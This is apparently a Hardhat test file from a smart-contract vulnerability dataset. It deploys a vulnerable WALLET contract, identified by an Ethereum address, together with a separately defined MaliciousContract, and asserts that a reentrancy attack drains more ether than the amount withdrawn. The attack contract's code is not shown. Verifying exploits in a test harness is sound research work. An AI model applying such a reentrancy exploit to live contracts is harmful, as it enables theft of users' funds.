const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const fs = require("fs");
describe("Reentrancy Attack for 0xcead721ef5b11f1a7b530171aab69b16c5e66b6e.sol", function () {
  let WALLET;
  let victim;
  let MaliciousContract;
  let hacker;
  let Log;
  let log;

  beforeEach(async function () {
    // Deploy Log contract
    const logPath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/reentrancy/0xcead721ef5b11f1a7b530171aab69b16c5e66b6e.sol/Log.json",
    );
    const logJson = JSON.parse(fs.readFileSync(logPath));
    Log = await ethers.getContractFactory(logJson.abi, logJson.bytecode);
    log = await Log.deploy();
    await log.waitForDeployment();

    // Deploy WALLET contract with Log address
    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/reentrancy/0xcead721ef5b11f1a7b530171aab69b16c5e66b6e.sol/WALLET.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    WALLET = await ethers.getContractFactory(json.abi, json.bytecode);
    victim = await WALLET.deploy(log.target);
    await victim.waitForDeployment();

    // Deploy MaliciousContract with WALLET address
    MaliciousContract = await ethers.getContractFactory(
      "contracts/reentrancy/0xcead721ef5b11f1a7b530171aab69b16c5e66b6e_attack.sol:MaliciousContract",
    );
    hacker = await MaliciousContract.deploy(victim.target);
  });

  it("sanity check: reentrancy/0xcead721ef5b11f1a7b530171aab69b16c5e66b6e.sol", async function () {
    await expect(victim.Put(0, { value: ethers.parseEther("10") })).to.not.be
      .reverted;
    expect(await ethers.provider.getBalance(victim.target)).to.equal(
      ethers.parseEther("10"),
    );
    await expect(victim.Collect(ethers.parseEther("10"))).to.not.be.reverted;
    expect(await ethers.provider.getBalance(victim.target)).to.equal(0);
  });

  it("should successfully drain funds through reentrancy attack", async function () {
    // Initial deposit to victim contract
    await victim.Put(0, { value: ethers.parseEther("5") });

    const victimInitialBalance = await ethers.provider.getBalance(
      victim.target,
    );
    expect(victimInitialBalance).to.equal(ethers.parseEther("5"));

    // Initial deposit from maliciousContract on victim contract
    await hacker.deposit({ value: ethers.parseEther("5") });

    const victimBalanceAfterDeposit = await ethers.provider.getBalance(
      victim.target,
    );
    expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("10"));

    //set hacker balance to 0
    await network.provider.send("hardhat_setBalance", [hacker.target, "0x0"]);
    let hackerBalance = await ethers.provider.getBalance(hacker.target);
    expect(hackerBalance).to.equal(0);

    // Perform reentrancy attack through MaliciousContract
    await hacker.attack(ethers.parseEther("3"));

    // Check balances after attack
    const victimBalance = await ethers.provider.getBalance(victim.target);
    const maliciousContractBalance = await ethers.provider.getBalance(
      hacker.target,
    );

    // Verify the attack was successful

    // victim has lost more funds than the withdrawal
    expect(victimBalance).to.be.below(ethers.parseEther("7"));

    // hacker has more than the withdrawal
    expect(maliciousContractBalance).to.be.above(ethers.parseEther("3"));
  });
});
